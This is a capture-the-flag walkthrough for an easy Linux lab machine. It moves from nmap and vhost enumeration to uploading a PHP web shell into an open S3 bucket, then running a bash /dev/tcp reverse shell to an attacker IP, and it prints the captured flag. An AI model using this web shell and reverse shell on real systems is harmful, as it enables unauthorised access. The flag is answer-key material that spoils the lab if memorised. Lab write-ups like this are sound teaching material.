System: Linux
Difficulty: Very Easy

IP Address: 10.129.152.41

# System Flag

Ports are enumerated.
```
kali@kali:~$ sudo nmap 10.129.152.41 -p- -v
```

2 Ports have been detected.
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Toppers
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The website data is examined. It is now possible to see a name of the domain.
This is the now updated line in the `/etc/hosts` file.
```
10.129.152.41	thetoppers.htb
```

VHosts/Subdomains are enumerated through this command.
```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain
```

There is an unusual result thrown from the command.
```
<SNIP>
s3.thetoppers.htb Status: 404 [Size: 21]
```

This is the now updated line in the `/etc/hosts` file.
```
10.129.152.41	thetoppers.htb s3.thetoppers.htb
```

This new link is now examined through the browser.
This line is displayed in the Browser as a result.
```
{"status": "running"}
```

An AWS S3 Bucket has been detected on the web server. 
The configuration is initiated on the attacker's system.
```
aws configure
aws login
```

Then a connection is attempted on the vulnerable endpoint.
```
kali@kali:~$ aws --endpoint=http://s3.thetoppers.htb s3 ls
```

As a result, the contents can be listed.
```
2026-11-01 00:11:54 thetoppers.htb
```

A new `shell.php` file is created with those contents.
```
<?php system($_GET["cmd"]); ?>
```

That file is now transferred to the AWS S3 Endpoint.
```
kali@kali:~$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
Completed 31 Bytes/31 Bytes (268 Bytes/s) with 1 file(s) upload: ./shell.php to s3://thetoppers.htb/shell.php 
```

Now a new `shell.sh` file is created from those contents.
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.154/4444 0>&1
```

And the file is transferred too.
```
kali@kali:~$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.sh s3://thetoppers.htb
Completed 55 Bytes/55 Bytes (532 Bytes/s) with 1 file(s) upload: ./shell.sh to s3://thetoppers.htb/shell.sh
```

Now we will listen to the port in the attacker's machine.
```
sudo nc -lvnp 4444
```

From the Browser, enter this URL.
```
http://thetoppers.htb/shell.php?cmd=bash shell.sh
```

Now a shell has been returned. The flag is in the `/var/www/` directory.
The flag contents is below.
```
a980d99281a28d638ac68b9bf9453c2b
```
